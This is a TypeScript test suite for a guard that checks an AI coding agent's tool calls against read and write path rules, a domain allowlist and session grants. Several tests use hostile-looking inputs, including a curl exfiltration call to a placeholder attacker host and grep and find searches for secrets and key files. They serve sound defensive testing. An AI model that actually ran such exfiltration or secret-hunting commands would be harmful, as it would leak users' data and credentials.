import test from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  createGuard,
  unjudgeableDecision,
  type GuardPolicy,
  type ToolCallLike,
} from "../src/guard.ts";
import type { ToolSchema } from "../src/claims.ts";
import { canonicalizePath, type CanonicalPath } from "../src/policy.ts";

const root = mkdtempSync(join(tmpdir(), "guard-"));
const allowed = join(root, "allowed");
const denied = join(root, "denied");
mkdirSync(allowed);
mkdirSync(denied);

const policy: GuardPolicy = {
  allowRead: [allowed],
  denyRead: [denied],
  allowWrite: [allowed],
  denyWrite: [],
  allowedDomains: ["github.com", "*.npmjs.org"],
};

test("allows a read inside an allowed root", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({ toolName: "read", input: { path: join(allowed, "file.txt") } }),
    {},
  );
});

test("refuses a read inside a denied region, naming the path and the tool", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "read",
    input: { path: join(denied, "file.txt") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /read/);
  assert.match(decision.reason ?? "", /denyRead/);
  assert.match(decision.reason ?? "", /file\.txt/);
});

test("re-opens a denied region where allowRead names a path beneath it", () => {
  // The upstream deny-then-allow pattern: denyRead: ["/Users"], allowRead: ["."].
  const guard = createGuard({
    policy: { ...policy, denyRead: [root], allowRead: [allowed] },
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({ toolName: "read", input: { path: join(allowed, "file.txt") } }),
    {},
  );
  assert.equal(
    guard({ toolName: "read", input: { path: join(denied, "file.txt") } })
      .block,
    true,
  );
});

test("keeps a deny that is more specific than the allowance covering it", () => {
  const guard = createGuard({
    policy: {
      ...policy,
      denyRead: [join(denied, "*.env")],
      allowRead: [denied],
    },
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.equal(
    guard({ toolName: "read", input: { path: join(denied, "x.env") } }).block,
    true,
  );
  assert.deepEqual(
    guard({ toolName: "read", input: { path: join(denied, "notes.md") } }),
    {},
  );
});

test("judges a read by the read rules alone, not by what is writable", () => {
  const guard = createGuard({
    policy: {
      ...policy,
      allowRead: [],
      denyRead: [root],
      allowWrite: [allowed],
    },
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "read",
    input: { path: join(allowed, "file.txt") },
  });

  assert.equal(
    decision.block,
    true,
    "being writable must not make a path readable",
  );
  assert.match(decision.reason ?? "", /denyRead/);
});

test("refuses an extension Tool that only reads inside a denied region", () => {
  // The read-only half of story 5: introspection must not assume every extension Tool writes.
  const reader = toolSchema("lint_notes", { path: { type: "string" } });
  const guard = createGuard({
    policy,
    tools: () => [reader],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "lint_notes",
    input: { path: join(denied, "notes.md") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /read/);
  assert.match(decision.reason ?? "", /denyRead/);
});

/** A Tool contributed by another pi-package, as pi advertises it via `getAllTools()`. */
function toolSchema(
  name: string,
  properties: Record<string, { type?: unknown }>,
): ToolSchema {
  return { name, parameters: { properties } };
}

const formatter = toolSchema("format_md_tables", { path: { type: "string" } });

test("refuses a write by an extension Tool that is neither write nor edit", () => {
  const guard = createGuard({
    policy,
    tools: () => [formatter],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "format_md_tables",
    input: { path: join(denied, "doc.md") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /write/);
  assert.match(decision.reason ?? "", /format_md_tables/);
});

test("allows that same extension Tool to write inside allowWrite", () => {
  const guard = createGuard({
    policy,
    tools: () => [formatter],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({
      toolName: "format_md_tables",
      input: { path: join(allowed, "doc.md") },
    }),
    {},
  );
});

test("refuses a read-hinted Tool when it writes outside allowWrite", () => {
  // The fail-open this ticket closes: `show` read like a reader, so this Tool's writes went
  // unchecked wherever denyRead did not reach.
  const saver = toolSchema("show_diff_and_save", { path: { type: "string" } });
  const guard = createGuard({
    policy,
    tools: () => [saver],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "show_diff_and_save",
    input: { path: join(root, "elsewhere", "file.txt") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /write/);
});

test("refuses an inferred claim that passes the write rules but matches denyRead", () => {
  const writer = toolSchema("mystery_writer", { path: { type: "string" } });
  const guard = createGuard({
    policy: { ...policy, allowWrite: [denied] },
    tools: () => [writer],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "mystery_writer",
    input: { path: join(denied, "file.txt") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /denyRead/);
});

test("an inferred refusal names the Tool and shows the declaration to add", () => {
  const writer = toolSchema("mystery_writer", { path: { type: "string" } });
  const guard = createGuard({
    policy,
    tools: () => [writer],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "mystery_writer",
    input: { path: join(root, "elsewhere", "file.txt") },
  });

  assert.match(decision.reason ?? "", /mystery_writer/);
  assert.match(decision.reason ?? "", /"fields": \["path"\]/);
  assert.match(decision.reason ?? "", /read.*write/);
});

test("a declared access is judged by its own rule set alone, never both", () => {
  const reader = toolSchema("declared_reader", { path: { type: "string" } });
  const guard = createGuard({
    policy,
    tools: () => [reader],
    overrides: {
      declared_reader: { fields: ["path"], access: "read" },
    },
    cwd: root,
  });

  // Readable but not writable: a declared read must not also be judged against the write rules.
  assert.deepEqual(
    guard({
      toolName: "declared_reader",
      input: { path: join(allowed, "file.txt") },
    }),
    {},
  );
});

test("refuses a declared Tool whose path field matched nothing, so a config typo cannot fail open", () => {
  const writer = toolSchema("mystery_writer", { path: { type: "string" } });
  const guard = createGuard({
    policy,
    tools: () => [writer],
    // The field name is a typo for the Tool's `path`: the call must be refused, not waved through.
    overrides: { mystery_writer: { fields: ["paths"], access: "write" } },
    cwd: root,
  });

  const decision = guard({
    toolName: "mystery_writer",
    input: { path: join(root, "elsewhere", "file.txt") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /mystery_writer/);
});

test("denyWrite beats allowWrite", () => {
  const guard = createGuard({
    policy: { ...policy, denyWrite: [join(allowed, "secret.env")] },
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "write",
    input: { path: join(allowed, "secret.env") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /denyWrite/);
});

test("an explicit config entry beats the Tool-name heuristic", () => {
  const guard = createGuard({
    policy,
    tools: () => [toolSchema("lint_notes", { out: { type: "string" } })],
    overrides: { lint_notes: { fields: ["out"], access: "write" } },
    cwd: root,
  });

  const decision = guard({
    toolName: "lint_notes",
    input: { out: join(denied, "notes.md") },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /write/);
});

test("refuses an unmapped Tool that advertises no path field", () => {
  const guard = createGuard({
    policy,
    tools: () => [toolSchema("publish_notes", { mode: { type: "string" } })],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "publish_notes",
    input: { mode: "dry-run" },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /publish_notes/);
});

test("refuses a Tool it has no schema for at all", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const decision = guard({ toolName: "mystery_tool", input: {} });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /mystery_tool/);
});

test("judges a Tool that appears in the provider after the guard is built", () => {
  let tools: ToolSchema[] = [];
  const guard = createGuard({
    policy,
    tools: () => tools,
    overrides: {},
    cwd: root,
  });
  const call = {
    toolName: "late_tool",
    input: { path: join(denied, "file.txt") },
  };

  const before = guard(call);
  assert.equal(before.block, true);
  assert.match(before.reason ?? "", /Declare the Tool/);

  // pi has no tool-set-change event, so a snapshot taken at session start would go stale here.
  tools = [toolSchema("late_tool", { path: { type: "string" } })];

  const after = guard(call);
  assert.equal(after.block, true);
  assert.match(after.reason ?? "", /write/);
  assert.doesNotMatch(after.reason ?? "", /Declare the Tool/);
});

test("routes an unmapped Tool and a malformed claim through one fail-closed path", () => {
  const unmapped = unjudgeableDecision({ kind: "unmapped" }, "mystery_tool");
  const malformed = unjudgeableDecision(
    {
      kind: "malformed-claim",
      claim: {
        path: "not/canonical" as CanonicalPath,
        access: "read",
        basis: "declared",
      },
    },
    "mystery_tool",
  );

  assert.equal(unmapped.block, true);
  assert.equal(malformed.block, true);
  assert.notEqual(unmapped.reason, malformed.reason);
  // A programmer error gets no tutorial prose; an unmapped Tool keeps its user remedy.
  assert.match(unmapped.reason ?? "", /Declare the Tool/);
  assert.doesNotMatch(malformed.reason ?? "", /Declare the Tool/);
});

test("allows a Tool declared as touching no paths", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: { no_path_tool: { fields: [], access: "none" } },
    cwd: root,
  });

  assert.deepEqual(guard({ toolName: "no_path_tool", input: {} }), {});
});

test("refuses a command naming a domain outside allowedDomains", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const decision = guard({
    toolName: "bash",
    input: { command: "curl https://evil.example.com/exfil" },
  });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", /evil\.example\.com/);
});

test("allows a command naming an allowed domain, including a wildcard match", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({
      toolName: "bash",
      input: { command: "curl https://registry.npmjs.org/pkg" },
    }),
    {},
  );
});

test("leaves command filesystem access to the OS fence", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({ toolName: "bash", input: { command: "cat /etc/hosts" } }),
    {},
  );
});

test("fences grep, find and ls, which the previous guard left unchecked", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const calls: ToolCallLike[] = [
    { toolName: "grep", input: { pattern: "secret", path: denied } },
    { toolName: "find", input: { pattern: "*.key", path: denied } },
    { toolName: "ls", input: { path: denied } },
  ];

  for (const call of calls) {
    const decision = guard(call);
    assert.equal(decision.block, true, `${call.toolName} should be refused`);
    assert.match(decision.reason ?? "", /denyRead/);
  }
});

test("judges a call that omits an optional path against the working directory", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: denied,
  });

  const decision = guard({ toolName: "grep", input: { pattern: "secret" } });

  assert.equal(decision.block, true);
  assert.match(decision.reason ?? "", new RegExp(denied));
});

test("judges a glob under the directory it names", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.deepEqual(
    guard({ toolName: "read", input: { path: join(allowed, "*.md") } }),
    {},
  );

  const decision = guard({
    toolName: "read",
    input: { path: join(denied, "*.md") },
  });
  assert.equal(decision.block, true);
});

test("judges a relative path against the session's working directory", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });
  const call = { toolName: "read", input: { path: `denied/notes.md` } };

  assert.equal(
    guard(call).block,
    true,
    "a relative claim must resolve against the session cwd",
  );

  guard.grantPath(`denied/notes.md`);

  assert.deepEqual(
    guard(call),
    {},
    "the grant must be compared in the same form",
  );
});

test("allows a refused call once its path is granted for the session", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });
  const call = { toolName: "read", input: { path: join(denied, "file.txt") } };

  assert.equal(guard(call).block, true);

  guard.grantPath(join(denied, "file.txt"));

  assert.deepEqual(guard(call), {});
});

test("a grant covers the path it names and nothing beside it", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  guard.grantPath(join(denied, "file.txt"));

  assert.equal(
    guard({ toolName: "read", input: { path: join(denied, "other.txt") } })
      .block,
    true,
  );
});

test("a directory grant covers a file beneath it and not a sibling sharing its prefix", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });
  const sibling = `${denied}-sibling`;
  mkdirSync(sibling);

  guard.grantPath(denied);

  assert.deepEqual(
    guard({ toolName: "write", input: { path: join(denied, "file.txt") } }),
    {},
  );
  assert.equal(
    guard({ toolName: "write", input: { path: join(sibling, "file.txt") } })
      .block,
    true,
  );
});

test("refuses a glob grant loudly, so a pattern cannot silently grant less", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  const result = guard.grantPath(join(denied, "*.env"));

  if (result.granted) assert.fail("a glob must not be granted");
  assert.match(result.reason, /pattern/);
  assert.equal(
    guard({ toolName: "read", input: { path: join(denied, "x.env") } }).block,
    true,
  );
});

test("a grant of a path that does not exist yet still covers it once it appears", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });
  const future = join(denied, "future.txt");

  guard.grantPath(future);

  assert.deepEqual(guard({ toolName: "read", input: { path: future } }), {});
});

test("a tool grant covers every path that Tool touches", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  guard.grantTool("read");

  assert.deepEqual(
    guard({ toolName: "read", input: { path: join(denied, "anywhere.txt") } }),
    {},
  );
  assert.equal(
    guard({ toolName: "write", input: { path: join(denied, "anywhere.txt") } })
      .block,
    true,
  );
});

test("a grant also covers an unmapped Tool", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  assert.equal(guard({ toolName: "mystery_tool", input: {} }).block, true);

  guard.grantTool("mystery_tool");

  assert.deepEqual(guard({ toolName: "mystery_tool", input: {} }), {});
});

test("lists what has been granted, so the user can see what they opened", () => {
  const guard = createGuard({
    policy,
    tools: () => [],
    overrides: {},
    cwd: root,
  });

  guard.grantPath(join(denied, "file.txt"));
  guard.grantTool("mystery_tool");

  // Grants are stored canonicalized, and the temporary directory is itself a symlink on macOS.
  assert.deepEqual(guard.grants(), {
    paths: [canonicalizePath(join(denied, "file.txt"))],
    tools: ["mystery_tool"],
  });
});
